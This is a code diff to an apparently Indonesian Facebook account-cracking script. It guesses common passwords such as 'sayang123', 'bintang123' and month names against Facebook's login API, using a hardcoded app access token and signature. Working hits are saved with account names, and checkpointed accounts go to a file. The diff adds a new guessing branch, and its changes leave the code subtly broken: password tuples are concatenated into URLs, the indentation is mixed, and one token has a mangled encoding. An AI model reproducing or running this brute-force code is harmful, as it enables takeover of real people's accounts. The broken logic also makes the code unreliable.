@@ -1385,7 +1385,7 @@ def pilih_super():
 											cekpoint.append(user+pass4)
 										else:
 											#Pass5
-											pass5 = "sayang123, sayangku123"
+											pass5 = "sayang123","sayangku123"
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -1401,7 +1401,7 @@ def pilih_super():
 													cekpoint.append(user+pass5)
 												else:
 													#Pass6
-													pass6 = "bintang123, bintang12345"
+													pass6 = "bintang123","bintang12345"
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -1419,7 +1419,7 @@ def pilih_super():
 															#Pass7
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = "sayang, doraemon, bintang, someone, bajingan, anjing, pukimak, playboy"
+															pass7 = "sayang","doraemon","bintang","someone","bajingan","anjing","pukimak","playboy"
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -1433,7 +1433,24 @@ def pilih_super():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
-																	
+                                                                                                                                else:
+                                                                                                                                        #Pass8
+                                                                                                                                         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+                                                                                                                                         b = json.loads(a.text)
+                                                                                                                                         pass8 = "januari","februari","maret123","april","mei123","juni123","juli123","agustus","september","november","desember"
+                                                                                                                                         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                                                                                                                                         q = json.load(data)
+                                                                                                                                         if 'access_token' in q:
+                                                                                                                                                 x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+                                                                                                                                                 z = json.loads(x.text)
+                                                                                                                                                 print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass8+" =>"+z['name'])
+                                                                                                                                                 oks.append(user+pass8)
+                                                                                                                                         else:
+                                                                                                                                                 if 'www.facebook.com' in q["error_msg"]:
+                                                                                                                                                         cek = open("out/super_cp.txt", "a")
+                                                                                                                                                         cek.write(user+"|"+pass8+"\n")
+                                                                                                                                                         cek.close()
+                                                                                                                                                         cekpoint.append(user+pass8)																	
 															
 		except:
 			pass
